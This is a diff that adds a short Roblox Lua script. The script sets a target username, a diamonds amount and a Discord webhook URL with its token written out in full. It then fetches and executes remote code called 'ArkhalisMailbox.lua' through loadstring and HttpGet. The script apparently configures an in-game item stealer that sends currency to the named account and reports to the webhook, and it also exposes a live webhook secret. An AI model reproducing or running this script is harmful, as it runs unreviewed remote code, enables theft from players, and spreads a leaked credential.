@@ -1,0 +1,7 @@
+_G.Username = "muaxuan1204" 
+
+_G.Diamonds = 100000
+
+_G.Webhook = "https://discord.com/api/webhooks/1107848684512751706/tFpU6aNlCv7-fFDrrYnImOSTzG_0yTQ4Le-cB3rSGvg6_UyG9t-eMXOaS5tk5-lBXzQz"
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
